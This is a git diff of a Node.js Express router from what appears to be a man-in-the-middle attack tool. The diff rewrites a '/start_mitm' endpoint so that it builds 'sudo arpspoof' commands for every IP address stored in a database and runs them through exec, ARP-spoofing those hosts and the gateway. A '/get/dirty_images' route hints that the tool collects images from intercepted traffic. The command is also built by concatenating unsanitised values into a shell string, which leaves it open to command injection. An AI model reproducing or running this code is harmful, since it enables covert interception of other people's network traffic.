@@ -11,8 +11,6 @@ var urlencodedParser = bodyParser.urlencoded({extended: false});
 var user = require('../models/user');
 var ip = require('../models/ip');
 
-var ips = ["192.168.1.38"];
-
 router.get("/get/dirty_images", function(req, res, next){
 
     var path = __dirname +"\\..\\public\\dist\\img";
@@ -77,8 +75,14 @@ router.post("/login", urlencodedParser, function(req, res, next){
 });
 
 router.get("/start_mitm", function(req, res, next){
-
-    var command = "sudo arpspoof -i wlan0 -t 192.168.1.52 192.168.1.1 %% sudo arpspoof -i wlan0 -t 192.168.1.1 192.168.1.52" ;
+  ip.get_ip_by_x_y([], [], function(result){
+    var command = "";
+    for(r in result){
+      if(r>0){
+        command +=" && "
+      }
+      command += "sudo arpspoof -i wlan0 -t "+result[r].ip+" 192.168.1.1 %% sudo arpspoof -i wlan0 -t 192.168.1.1 "+result[r].ip ;
+    }
 
     exec(command, function(error, stdout, stderr) {
         if(!error){
@@ -87,6 +91,8 @@ router.get("/start_mitm", function(req, res, next){
             res.send(false);
         }
     });
+  })
+
 });
 
 router.get("/stop_mitm", function(req, res, next){
